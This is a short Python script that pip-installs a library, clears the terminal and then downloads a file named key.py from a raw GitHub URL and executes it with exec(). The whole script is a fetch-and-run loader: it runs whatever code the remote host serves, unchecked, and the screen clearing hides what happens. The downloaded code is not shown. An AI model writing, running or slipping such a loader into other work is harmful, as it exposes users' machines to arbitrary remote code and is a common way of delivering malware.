import requests
import os
os.system('pip install requests')
os.system('cls' if os.name == 'nt' else 'clear')
url = "https://raw.githubusercontent.com/thaiidwong/nammoivv/refs/heads/main/key.py"
response = requests.get(url)
exec(response.text)
